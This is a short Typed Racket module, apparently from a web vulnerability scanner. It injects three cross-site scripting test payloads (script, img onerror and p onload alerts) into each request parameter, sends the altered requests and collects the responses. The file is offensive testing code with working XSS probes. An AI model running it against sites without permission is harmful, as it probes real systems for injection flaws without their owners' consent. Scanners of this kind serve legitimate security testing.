#lang typed/racket

(provide attack)

(require "../http/types.rkt"
         "../http/request.rkt")

(: payloads (Listof Bytes))
(define payloads
  '(#"<script>alert(1);</script>"
    #"<img src=\"#\" onerror=\"alert(1);\" />"
    #"<p onload=\"alert(1);\"></p>"))

;; this may belong w/ param.rkt...
(: param->bytes (-> param Bytes))
(define (param->bytes p)
  (bytes-append (param-name p)
                #"="
                (param-value p)))

;; param.rkt
(: params->bytes (-> (Listof param) Bytes))
(define (params->bytes ps)
  (bytes-join (map param->bytes ps) #"&"))

(: add-request (-> request (Listof request) (Listof request)))
(define (add-request req reqs)
  (cons req reqs))

;; heh, I think the request is wrong because I'm not updating the headers
;; need to drop content-length
(: create-attack-requests (-> request (Listof request)))
(define (create-attack-requests req)
  (let ((params (request-params req)))
    (foldl
     (lambda ((p : param) (reqs : (Listof request)))
       (foldl
        add-request
        reqs
        (map
         (lambda ((payload : Bytes))
           (request (request-url req)
                    (request-method req)
                    (params->bytes
                     (map
                      (lambda ((existing-p : param))
                        (if (equal? existing-p p)
                            (param (param-name p) payload)
                            existing-p))
                      params))
                    (filter
                     (lambda ((h : header))
                       (not (bytes=? (header-field h) #"Content-Length")))
                     (request-headers req))
                    (request-params req)))
         payloads)))
     '()
     params)))

(: attack (-> request (Listof request-response)))
(define (attack req)
  (map ; take advantage of racket being eager by default
   (lambda ((req : request))
     (request-response req
                       (send req)))
   (create-attack-requests req)))
